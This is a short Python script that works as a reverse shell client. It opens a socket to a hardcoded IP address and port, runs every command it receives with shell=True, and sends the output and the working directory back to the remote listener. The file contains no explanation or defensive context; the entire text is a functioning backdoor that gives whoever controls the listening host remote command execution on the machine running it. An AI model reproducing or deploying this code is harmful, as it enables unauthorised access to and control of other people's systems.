import os
import socket
import subprocess

host = "10.1.10.99" #the current ip address of the machine
port = 9879 # or any big number
skt = socket.socket()
skt.connect((host,port))

while 1:
    data = skt.recv(1024)
    if len(data) > 0:
        cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdout=subprocess.PIPE)
        byte = cmd.stdout.read() + cmd.stderr.read()
        output = str(byte, "utf-8")
        wd = os.getcwd()
        wd = str(wd)+"$ "
        skt.send(str.encode(output+wd))
